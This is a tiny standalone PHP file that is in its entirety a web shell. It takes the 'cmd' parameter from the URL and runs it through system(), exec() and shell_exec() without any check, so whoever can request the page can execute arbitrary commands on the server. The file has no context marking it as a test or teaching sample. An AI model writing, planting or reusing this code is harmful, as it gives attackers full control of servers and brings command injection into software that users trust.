<?php
$cmd = $_GET['cmd'] ?? '';
system($cmd);
exec($cmd);
shell_exec($cmd);
